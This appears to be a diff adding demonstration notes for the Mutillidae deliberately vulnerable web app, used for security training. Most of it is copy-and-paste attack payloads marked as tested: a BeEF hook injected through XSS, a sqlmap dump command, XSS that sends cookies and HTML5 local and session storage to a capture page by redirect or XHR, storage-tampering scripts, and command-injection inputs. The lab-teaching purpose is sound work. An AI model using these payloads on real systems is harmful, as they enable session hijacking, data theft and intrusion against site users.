@@ -1,0 +1,1226 @@
+Topics
+
+Installation
+
+	XAMPP
+	VM
+	Samurai - Bootable DVD
+	Samurai Installation
+	Custom Bootable DVD
+
+Mutillidae Uses
+
+1. Teach web developers how to write secure code
+2. Teach web developers what exploits may be possible
+3. Teach web developers insecure coding patterns
+4. Demonstrate to DBAs what exploits may be possible
+5. Demonstrate to management what exploits may be possible
+
+--------------------
+Demonstration
+--------------------
+
+Pen Testing Methodology (CEH version)
+
+	Recon
+	Scanning (Discover hosts, ports, services, internal network map, Enumerating user names)
+	Gaining Access
+	Maintaining Access
+	Cover Tracks
+
+----------------------------------------
+BEEF Framework
+----------------------------------------
+
+Put this text into the add-to-my-blog as a blog entry:
+
+Most developers do not understand how dangerous XSS can be
+<script src=\'http://192.168.56.103/beef/hook/beefmagic.js.php\'></script>
+
+----------------------------------------
+Grendel Scan
+----------------------------------------
+Backtrack 5: 
+	Change directory to /pentest/web/grendel-scan/. 
+	Run grendel.sh to pull up GUI. 
+	Provide target URL. 
+	Provide non-existent output directory. 
+	Configure plug-ins. 
+	Run scan.
+	When scan is done, click terminate scan.
+	Report will be generated.
+
+----------------------------------------
+RatProxy
+----------------------------------------
+
+To scan generally:
+	Backtrack 5:
+		Capture Data: /usr/bin/ratproxy -w ~/pentests/scan-results/mutillidae/ratproxy/20110115.log -v ~/pentests/scan-results/mutillidae/ratproxy -d 192.168.56.101 -p 8088 -lextscgj
+		Generate Report: ratproxy-report.sh ~/pentests/scan-results/mutillidae/ratproxy/20110115.log > mut-rat.html
+
+To find XSS:
+	Backtrack 5:
+		Capture Data: /usr/bin/ratproxy -w ~/pentests/scan-results/mutillidae/ratproxy/20110115.log -v ~/pentests/scan-results/mutillidae/ratproxy -d 192.168.56.101 -p 8088 -x
+		Generate Report: ratproxy-report.sh ~/pentests/scan-results/mutillidae/ratproxy/20110115.log > mut-rat.html
+
+----------------------------------------
+SQLMAP
+----------------------------------------
+
+*** CONFIRMED! ***
+python sqlmap.py --url="http://192.168.56.101/mutillidae/index.php?page=view-someones-blog.php" --data="author=6C57C4B5-B341-4539-977B-7ACB9D42985A&view-someones-blog-php-submit-button=View+Blog+Entries" --level=1 --beep --dump
+
+----------------------------------------
+HTML 5 - Injecting XSS into JSON
+----------------------------------------
+
+	Page: pen-test-tool-lookup.php
+	
+	Beginner: Pop up an alert box to show injection worked
+	
+		Unencoded: "}} );alert(1);//
+		Complete Injection: "}} )%3balert(1)%3b//
+		Prefix: "}} )%3b
+		Payload: alert(1)%3b
+		Suffix: //
+	
+		Copy and Paste: "}} )%3balert(1)%3b//
+	
+	Intermediate: Steal cookie with redirection
+	
+		Unencoded:"}} );document.location="http://localhost/mutillidae/capture-data.php?cookie=" + document.cookie;//
+		Prefix:"}} )%3b
+		Payload:document.location%3d%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3b
+		Suffix://
+		Complete Injection: "}} )%3bdocument.location%3d%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3b//
+	
+		Copy and Paste:
+		
+		"}} )%3bdocument.location%3d%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3b//
+	
+	Professional: Steal cookies with XHR injection
+		--------------------------------------------------------------------------------
+		Generic XHR using GET and XMLHttpRequest to steal cookies
+		- prefix and suffix as neccesary
+		- This is optimized for Firefox which has XMLHttpRequest. Some newer IE will as well.
+		NOTE: During Reconnassaince, study your target to determine what kind of browser
+		they have so the scripts can be tailored and testing for those browsers.
+		--------------------------------------------------------------------------------
+	
+		This is a "UDP-style GET". We fire and forget but cannot know if succeeded or failed. Perfect for using against savvy users.
+	
+		Copy and Paste:
+	
+		<script> var lXMLHTTP; try{ var lAction = "http://localhost/mutillidae/capture-data.php?cookie=" + document.cookie; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open("GET", lAction); lXMLHTTP.send(""); }catch(e){} </script>
+	
+		--------------------------------------
+		URL Encoded Version
+		--------------------------------------
+		Prefix: "}} )%3b
+		Payload: var+lXMLHTTP%3btry%7b+var+lAction+%3d+%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3blXMLHTTP+%3d+new+XMLHttpRequest()%3b+lXMLHTTP.onreadystatechange+%3d+function()%7b%7d%3blXMLHTTP.open(%22GET%22%2c+lAction)%3blXMLHTTP.send(%22%22)%3b%7dcatch(e)%7b%7d
+		Suffix: //
+		Complete Injection: "}} )%3bvar+lXMLHTTP%3btry%7b+var+lAction+%3d+%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3blXMLHTTP+%3d+new+XMLHttpRequest()%3b+lXMLHTTP.onreadystatechange+%3d+function()%7b%7d%3blXMLHTTP.open(%22GET%22%2c+lAction)%3blXMLHTTP.send(%22%22)%3b%7dcatch(e)%7b%7d//
+	
+		Copy and Paste:
+		
+		"}} )%3bvar+lXMLHTTP%3btry%7b+var+lAction+%3d+%22http%3a%2f%2flocalhost%2fmutillidae%2fcapture-data.php%3fcookie%3d%22+%2b+document.cookie%3blXMLHTTP+%3d+new+XMLHttpRequest()%3b+lXMLHTTP.onreadystatechange+%3d+function()%7b%7d%3blXMLHTTP.open(%22GET%22%2c+lAction)%3blXMLHTTP.send(%22%22)%3b%7dcatch(e)%7b%7d//
+
+--------------------------------------------------------------------------------
+HTML 5 - Local and session storage - setting values
+--------------------------------------------------------------------------------
+
+Setting Test Values for HTML5 Storage
+
+	// You can use these statements to set some test values.
+	localStorage.setItem("key1","value1");
+	localStorage.setItem("key2","value2");
+	sessionStorage.setItem("key1","value1");
+	sessionStorage.setItem("key2","value2");
+
+--------------------------------------------------------------------------------
+HTML 5 - Local and session storage - Reading values
+--------------------------------------------------------------------------------
+	
+	--------------------------------------------------------------------------------
+	Reading current HTML5 storage from local browser
+	--------------------------------------------------------------------------------
+
+	<script>
+		try{
+			var m = "";
+			var l = window.localStorage;
+			var s = window.sessionStorage;
+			
+			for(i=0;i<l.length;i++){
+				var lKey = l.key(i);
+				m += lKey + "=" + l.getItem(lKey) + ";\n";
+			}; 
+			
+			for(i=0;i<s.length;i++){
+				var lKey = s.key(i);
+				m += lKey + "=" + s.getItem(lKey) + ";\n";
+			};
+			
+			alert(m);
+		}catch(e){
+			alert(e.message);
+		}
+	</script>
+
+	Copy and Paste:
+
+	// JavaScript Alert Box Method
+	
+		<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}</script>
+
+	// window.document.write method
+	
+		<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.document.write(m);}catch(e){alert(e.message);}</script>
+
+	Copy and Paste both scripts (DOM injection version) - TESTED SUCCESSFULLY
+
+		<span onmouseover='try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}'>DANGER: DONT MOUSEOVER</span>
+
+	// Fireug console.log() or console.debug() method - 
+	// NOTE: This version must be executed in the Firebug console. The script tags are not needed.
+	
+		try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}
+
+--------------------------------------------------------------------------------
+HTML 5 - Local and session storage - Adding values
+--------------------------------------------------------------------------------
+
+	--------------------------------------------------------------------------------
+	Adding values to HTML5 Storage (Possible Session Fixation)
+	--------------------------------------------------------------------------------
+
+	<script>
+		localStorage.setItem("AccountNumber","123456");
+		sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");
+		sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");		
+		sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");
+	</script>
+	
+	Copy and Paste script to add values - TESTED SUCCESSFULLY
+	
+		<script>try{localStorage.setItem("AccountNumber","123456");sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");}catch(e){alert(e.message);}</script>	
+	
+	Copy and Paste script to read values (Alert box version)
+	
+		<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}</script>
+	
+	Copy and Paste both scripts (Cross Site Scripting version - Reflected) - TESTED SUCCESSFULLY
+
+		<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);localStorage.setItem("AccountNumber","123456");sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}</script>
+
+	Copy and Paste both scripts (Cross Site Scripting version - Persistent) - TESTED SUCCESSFULLY
+
+		NOTE: This version "MySQL escapes" the "\n" new-line character by doubling up the "\" character because "\n" means new-line in MySQL and this is going to be inserted into the database.
+		<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\\n";};alert(m);}catch(e){alert(e.message);};localStorage.setItem("AccountNumber","123456");sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\\n";};alert(m);}catch(e){alert(e.message);}</script>
+
+	Copy and Paste both scripts (DOM injection version) - TESTED SUCCESSFULLY
+
+		<span onmouseover='try{localStorage.setItem("AccountNumber","789456");sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}'>DANGER: DONT MOUSEOVER</span>
+
+	Copy and Paste both scripts (Firebug console version) - TESTED SUCCESSFULLY
+
+		try{localStorage.setItem("AccountNumber","789456");sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}	
+
+	--------------------------------------------------------------------------------
+	Adding values to another users HTML5 Storage and re-displaying page - PRO VERSION
+	--------------------------------------------------------------------------------
+
+		<script>localStorage.setItem("NewSessionToken","This was set by a XSS."); var node=window.document.getElementById("idSessionStorageTableBody"); while(node.hasChildNodes()){node.removeChild(node.firstChild)}; init();</script>
+
+--------------------------------------------------------------------------------
+HTML 5 - Local and session storage - Altering values
+--------------------------------------------------------------------------------
+
+	----------------------------------------------------------------------------------------------
+	Over-writting Storage (Possible Session Fixation) - Set or change current HTML5 values in own browser
+	----------------------------------------------------------------------------------------------
+
+	Copy and Paste all three scripts (Firebug console version) - TESTED SUCCESSFULLY
+	(first script reads, second script overwrites, thrid script reads again)
+
+		try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}try{localStorage.setItem("MessageOfTheDay","This was set by Firebug console!"); sessionStorage.setItem("CartSession","ABCDEFG");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}
+
+	Copy and Paste both scripts (DOM injection version) - TESTED SUCCESSFULLY
+
+		<span onmouseover='try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}try{localStorage.setItem("MessageOfTheDay","This was set by Firebug console!"); sessionStorage.setItem("CartSession","ABCDEFG");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}'>DANGER: DONT MOUSEOVER</span>
+
+	----------------------------------------------------------------------------------------------
+	Over-writing Storage (Possible Session Fixation) - Set or change another users HTML5 values
+	----------------------------------------------------------------------------------------------
+	Example JavaScript
+
+		<script>
+			localStorage.setItem("MessageOfTheDay","Hello World");
+			sessionStorage.setItem("CartSession","ABCDEFG");
+		</script>
+
+	Refelcted (First Order) Cross Site Script - TESTED SUCCESSFULLY
+	Copy and Paste all three cross site scripts (alert box version) 
+	(first script reads, second script overwrites, thrid script reads again):
+
+		<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}try{localStorage.setItem("MessageOfTheDay","This was set by a reflected cross site script"); sessionStorage.setItem("CartSession","ABCDEFG");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}</script>
+
+	Peristent (Stored, Second Order) Cross Site Script - TESTED SUCCESSFULLY
+	Copy and Paste all three cross site scripts (alert box version) 
+	(first script reads, second script overwrites, thrid script reads again):
+	NOTE: This version "MySQL escapes" the "\n" new-line character by doubling up the "\" character because "\n" means new-line in MySQL and this is going to be inserted into the database.
+
+		<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\\n";};window.alert(m);}catch(e){alert(e.message);}try{localStorage.setItem("MessageOfTheDay","This was set by persistent XSS"); sessionStorage.setItem("CartSession","ABCDEFG");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\\n";};window.alert(m);}catch(e){alert(e.message);}</script>
+
+	DOM injected Cross Site Script - TESTED SUCCESSFULLY
+	Copy and Paste all three cross site scripts (alert box version) 
+	(first script reads, second script overwrites, thrid script reads again):
+	
+		<span onmouseover='try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}try{localStorage.setItem("MessageOfTheDay","This was set by a DOM injected XSS"); sessionStorage.setItem("CartSession","ABCDEFG");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}'>DANGER: WHATEVER YOU DO, FOR CRYING OUTLOUD PLEEAASSEEEE DONT MOUSEOVER</span>
+
+--------------------------------------------------------------------------------
+HTML 5 - Local and session storage - Deleting values
+--------------------------------------------------------------------------------
+
+	----------------------------------------------------------------------------------------------
+	Deleting own HTML5 Storage
+	----------------------------------------------------------------------------------------------
+
+	Copy and Paste all three scripts (Firebug console version) - TESTED SUCCESSFULLY
+	(first script reads, second script deletes, thrid script reads again)
+
+		try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.console.log(m);}catch(e){console.log(e.message);}try{localStorage.removeItem("MessageOfTheDay"); sessionStorage.removeItem("CartSession");}catch(e){console.log(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.console.log(m);}catch(e){console.log(e.message);}
+
+	Copy and Paste both scripts (DOM injection version) - TESTED SUCCESSFULLY
+
+		<span onmouseover='try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.console.log(m);}catch(e){console.log(e.message);}try{localStorage.removeItem("MessageOfTheDay"); sessionStorage.removeItem("CartSession");}catch(e){console.log(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.console.log(m);}catch(e){console.log(e.message);}'>DANGER: DONT MOUSEOVER</span>
+
+	----------------------------------------------------------------------------------------------
+	Deleting another users HTML5 Storage
+	----------------------------------------------------------------------------------------------
+	Example JavaScript
+	
+		<script>
+			localStorage.removeItem("MessageOfTheDay","Hello World");
+			sessionStorage.removeItem("CartSession","ABCDEFG");
+		</script>
+
+	Refelcted (First Order) Cross Site Script - TESTED SUCCESSFULLY
+	Copy and Paste all three cross site scripts (alert box version) 
+	(first script reads, second script overwrites, thrid script reads again):
+	
+			<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}try{localStorage.removeItem("MessageOfTheDay"); sessionStorage.removeItem("CartSession");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}</script>
+
+	Peristent (Stored, Second Order) Cross Site Script - TESTED SUCCESSFULLY
+	Copy and Paste all three cross site scripts (alert box version) 
+	(first script reads, second script overwrites, thrid script reads again):
+	NOTE: This version "MySQL escapes" the "\n" new-line character by doubling up the "\" character because "\n" means new-line in MySQL and this is going to be inserted into the database.
+
+		<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\\n";};window.alert(m);}catch(e){alert(e.message);}try{localStorage.removeItem("MessageOfTheDay"); sessionStorage.removeItem("CartSession");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\\n";};window.alert(m);}catch(e){alert(e.message);}</script>
+
+	DOM injected Cross Site Script - TESTED SUCCESSFULLY
+	Copy and Paste all three cross site scripts (alert box version) 
+	(first script reads, second script overwrites, thrid script reads again):
+	
+		<span onmouseover='try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}try{localStorage.removeItem("MessageOfTheDay"); sessionStorage.removeItem("CartSession");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}'>DANGER: WHATEVER YOU DO, FOR CRYING OUTLOUD PLEEAASSEEEE DONT MOUSEOVER</span>
+
+	--------------------------------------------------------------------------------
+	Deleting values to HTML5 Storage and re-displaying page - PRO VERSION
+	--------------------------------------------------------------------------------
+
+		<script>localStorage.removeItem("MessageOfTheDay"); var node=window.document.getElementById("idSessionStorageTableBody"); while(node.hasChildNodes()){node.removeChild(node.firstChild)}; init();</script>
+
+--------------------------------------------------------------------------------
+HTML 5 - Local and session storage - Stealing values
+--------------------------------------------------------------------------------
+
+	--------------------------------------------------------------------------------
+	Stealing another users HTML5 Storage: Testing
+	--------------------------------------------------------------------------------
+	
+	Script to test stealing Local Storage. Inject this into a cross-site script
+	vulneraility. Add a prefix and suffix as neccesary.
+
+		// XSS to steal local storage and session storage
+		<script>
+		
+			var s = sessionStorage;
+			var l = localStorage;
+			var m = "";
+			
+			// grab session storage
+			for(i=0;i<s.length;i++){
+				m += "sessionStorage(" + s.key(i) + "):" + s.getItem(s.key(i)) + "; ";
+			}
+			
+			// grab local storage
+			for(i=0;i<l.length;i++){
+				m += "localStorage(" + l.key(i) + "):" + l.getItem(l.key(i)) + "; ";
+			}
+			
+			alert(m);
+		
+		</script>
+
+	Copy and Paste:
+	
+		<script>try{var m = "";var l = window.localStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}</script>
+
+	--------------------------------------------------------------------------------
+	Steal HTML5 storage with redirection: Intermediate
+	--------------------------------------------------------------------------------
+
+	Copy and Paste - Reflected Cross Site Script - TESTED SUCCESSFULLY
+
+		<script>try{var m = "";var l = window.localStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";}; document.location="http://localhost/mutillidae/capture-data.php?html5storage=" + m;}catch(e){alert(e.message);}</script>	
+
+	Copy and Paste - Persistent Cross Site Script - TESTED SUCCESSFULLY
+	NOTE: This version "MySQL escapes" the "\n" new-line character by doubling up the "\" character because "\n" means new-line in MySQL and this is going to be inserted into the database.
+	
+		<script>try{var m = "";var l = window.localStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\\n";}; document.location="http://localhost/mutillidae/capture-data.php?html5storage=" + m;}catch(e){alert(e.message);}</script>
+
+	--------------------------------------------------------------------------------
+	Steal HTML5 storage with XHR injection: Professional
+	--------------------------------------------------------------------------------
+	Generic XHR using GET and XMLHttpRequest to steal cookies
+	- prefix and suffix as neccesary
+	- This is optimized for Firefox which has XMLHttpRequest. Some newer IE will as well.
+	NOTE: During Reconnassaince, study your target to determine what kind of browser
+	they have so the scripts can be tailored and testing for those browsers.
+	--------------------------------------------------------------------------------
+
+	This is a "UDP-style GET". We fire and forget but cannot know if succeeded or failed. Perfect for using against savvy users.
+	Collect the HTML5 storage first, then send the information to a capture page.
+
+		<script>
+			try{ 
+				var s = sessionStorage;
+				var l = localStorage;
+				var m = "";
+				var lXMLHTTP;
+							
+				for(i=0;i<s.length;i++){
+					m += "sessionStorage(" + s.key(i) + "):" + s.getItem(s.key(i)) + "; ";
+				}
+		
+				for(i=0;i<l.length;i++){
+					m += "localStorage(" + l.key(i) + "):" + l.getItem(l.key(i)) + "; ";
+				}
+		
+				var lAction = "http://localhost/mutillidae/capture-data.php?html5storage=" + m; 
+				lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; 
+				lXMLHTTP.open("GET", lAction); 
+				lXMLHTTP.send(""); 
+			}catch(e){} 
+		</script>
+
+	Copy and Paste
+	Reflected Cross Site Script - TESTED SUCCESSFULLY
+
+		<script>try{ var s = sessionStorage; var l = localStorage; var m = ""; var lXMLHTTP; for(i=0;i<s.length;i++){ m += "sessionStorage(" + s.key(i) + "):" + s.getItem(s.key(i)) + "; "; } for(i=0;i<l.length;i++){ m += "localStorage(" + l.key(i) + "):" + l.getItem(l.key(i)) + "; "; } var lAction = "http://localhost/mutillidae/capture-data.php?html5storage=" + m; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open("GET", lAction); lXMLHTTP.send(""); }catch(e){}</script>
+
+	Copy and Paste
+	Peristent (Stored, Second Order) Cross Site Script - TESTED SUCCESSFULLY
+	NOTE: This version "MySQL escapes" the "\n" new-line character by doubling up the "\" character because "\n" means new-line in MySQL and this is going to be inserted into the database.
+
+		<script>try{ var s = sessionStorage; var l = localStorage; var m = ""; var lXMLHTTP; for(i=0;i<s.length;i++){ m += "sessionStorage(" + s.key(i) + "):" + s.getItem(s.key(i)) + "; "; } for(i=0;i<l.length;i++){ m += "localStorage(" + l.key(i) + "):" + l.getItem(l.key(i)) + "; "; } var lAction = "http://localhost/mutillidae/capture-data.php?html5storage=" + m; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open("GET", lAction); lXMLHTTP.send(""); }catch(e){} </script>
+
+	Copy and Paste
+	DOM injected Cross Site Script - THIS NEEDS WORK - Causes SQL errors
+	
+		<span onmouseover='try{ var s = sessionStorage; var l = localStorage; var m = ""; var lXMLHTTP; for(i=0;i<s.length;i++){ m += "sessionStorage(" + s.key(i) + "):" + s.getItem(s.key(i)) + "; "; } for(i=0;i<l.length;i++){ m += "localStorage(" + l.key(i) + "):" + l.getItem(l.key(i)) + "; "; } var lAction = "http://localhost/mutillidae/capture-data.php?html5storage=" + m; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open("GET", lAction); lXMLHTTP.send(""); }catch(e){}'>DANGER: WHATEVER YOU DO, PLEEAASSEEEE DONT MOUSEOVER</span>
+
+-------------------------
+Command Injection
+-------------------------
+	Page: dns-lookup.php
+
+Recon: Discover available functionality using provided help
+
+	Windows XP: && help
+	Linux: && <cmd> --help
+	Linux: && man <cmd>
+
+Recon: Determine current directory
+
+	Windows XP: && dir
+	Linux: && pwd
+
